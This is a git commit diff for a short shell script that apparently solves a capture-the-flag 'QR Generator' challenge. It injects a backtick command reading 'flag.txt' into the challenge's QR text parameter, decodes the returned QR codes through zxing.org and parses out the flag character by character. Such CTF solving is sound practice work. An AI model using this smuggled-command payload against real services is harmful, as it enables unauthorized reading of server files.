5cc3ff82c7764dc3c3008e6961ce4385b92653a8
page2me kitarotao <page2me@msn.com>
2020-04-29 00:12:32 +0700

    Update decode.sh

--- QR Generator/decode.sh
+++ QR Generator/decode.sh
@@ -1,3 +1,2 @@
-#wget -c http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=%60cat%20flag.txt%20%7C%20cut%20-c%20{1..20}%60
-wget -qc https://zxing.org/w/decode?u=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30004%2Fqr%3Ftext%3D%2560cat%2520flag.txt%2520%257C%2520cut%2520-c%2520{1..34}%2560
-ls -rct decode\?u* | xargs cat | grep -o "Raw text[a-zA-Z0-9<>/_{}?]*<" | sed 's/Raw text<\/td><td><pre>//g' | sed 's/<\/pre><\/td><\/tr><tr><//g' | rev | cut -c 1- | rev | tr -d '\n'
+curl -s https://zxing.org/w/decode?u=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30004%2Fqr%3Ftext%3D%2560cat%2520flag.txt%2520%257C%2520cut%2520-c%2520{1..34}%2560 > qrcode.txt
+grep -o "Raw text[a-zA-Z0-9<>/_{}?]*<" qrcode.txt | sed 's/Raw text<\/td><td><pre>//g' | sed 's/<\/pre><\/td><\/tr><tr><//g' | rev | cut -c 1- | rev | tr -d '\n'
